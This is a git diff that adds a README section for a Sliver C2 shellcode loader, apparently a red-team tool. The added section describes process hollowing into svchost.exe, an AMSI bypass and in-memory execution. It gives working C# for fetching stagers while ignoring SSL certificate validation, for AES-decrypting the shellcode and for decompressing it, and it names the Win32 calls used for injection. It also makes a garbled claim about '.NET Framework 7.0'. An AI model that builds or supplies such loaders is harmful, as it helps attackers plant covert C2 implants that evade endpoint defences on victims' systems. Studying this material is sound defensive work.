@@ -39,3 +39,108 @@ sliver > jobs
 ```
 
 ![Setup Sliver lister and stager](./doc/img/sliver001.png "Setup Sliver lister and stager")
+
+## Shellcode Runner
+
+The features intended for inclusion in this shellcode runner are support for various staging scenarios offered by the Sliver C2 (such as raw shellcode, compression, AES encryption, and combinations thereof), process hollowing, AMSI bypass, in-memory execution to avoid touching the disk whenever possible, and flexibility in passing arguments without hard-coded parameters, allowing arguments to be passed on the fly. Different approaches could be taken to achieve these goals. The chosen approach involves writing a C# DLL assembly containing all the necessary methods, embedding it in the PowerShell script as a base64 string, decoding the assembly and loading it into the process using reflection, and then specifying the arguments and executing the methods.
+
+### Download the Shellcode
+
+One of the main problems encountered early on was that the default .NET WebClient object times out the connection after 60 seconds, and this attribute cannot be easily changed. The solution is to implement a slightly modified version of the WebClient object, allowing the default timeout to be overridden with a custom value. The implementation of this in C# is as follows:
+
+```csharp
+ public class WebClientWithTimeout : WebClient
+{
+    protected override WebRequest GetWebRequest(Uri address)
+    {
+        WebRequest wr = base.GetWebRequest(address);
+        wr.Timeout = 50000000; // timeout in milliseconds (ms)
+        return wr;
+    }
+}
+```
+
+Since a custom SSL certificate is being used, it is necessary to instruct the WebClient to ignore SSL certificate validation. This can be achieved by using a certificate validation handler that always returns true, as shown below:
+
+```csharp
+ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+```
+
+### Shellcode decryption
+
+On the Stagers wiki page, the Sliver C2 team provides a template for a C# shellcode runner that includes an implementation of AES decryption. The decryption method they provide can be used as follows:
+```csharp
+public static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
+{
+    byte[] key = Encoding.UTF8.GetBytes(AESKey);
+    byte[] IV = Encoding.UTF8.GetBytes(AESIV);
+
+    using (Aes aesAlg = Aes.Create())
+    {
+        aesAlg.Key = key;
+        aesAlg.IV = IV;
+        aesAlg.Padding = PaddingMode.None;
+
+        ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+        using (MemoryStream memoryStream = new MemoryStream(ciphertext))
+        {
+            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
+            {
+                cryptoStream.Write(ciphertext, 0, ciphertext.Length);
+                return memoryStream.ToArray();
+            }
+        }
+    }
+}
+```
+### Shellcode decompression
+
+Sliver C2 supports Gzip, Deflate, and Zlib compression algorithms. Zlib was not implemented because it is only supported on .NET Framework version 7.0 and above, which does not fit our use case. Therefore, the decompression algorithm parameter will be set to Gzip or Deflate. Any other value will be treated as "no decompression needed":
+
+```csharp
+public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
+{
+    byte[] decompressedArray = null;
+    if (CompressionAlgorithm == "deflate9")
+    {
+        using (MemoryStream decompressedStream = new MemoryStream())
+        {
+            using (MemoryStream compressStream = new MemoryStream(data))
+            {
+                using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
+                {
+                    deflateStream.CopyTo(decompressedStream);
+                }
+            }
+            decompressedArray = decompressedStream.ToArray();
+        }
+        return decompressedArray;
+    }
+    else if (CompressionAlgorithm == "gzip")
+    {
+        using (MemoryStream decompressedStream = new MemoryStream())
+        {
+            using (MemoryStream compressStream = new MemoryStream(data))
+            {
+                using (GZipStream gzipStream = new GZipStream(compressStream, CompressionMode.Decompress))
+                {
+                    gzipStream.CopyTo(decompressedStream);
+                }
+            }
+            decompressedArray = decompressedStream.ToArray();
+        }
+        return decompressedArray;
+    }
+    else
+    {
+        return data;
+    }
+}
+```
+
+### Process Hollowing
+
+Process hollowing is accomplished by injecting shellcode into a process that ideally also generates network traffic to remain more covert. The implementation follows a basic pattern using Win32 APIs such as CreateProcessA, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread to inject the code into processes like svchost.exe.
+
+Conditional operations were added to separate different workflows and to allow passing parameters to various methods. The final source code is implemented in the file [Loader.cs](https://github.com/Cyb3rDudu/SliverLoader/blob/main/SliverLoader/Loader.cs).
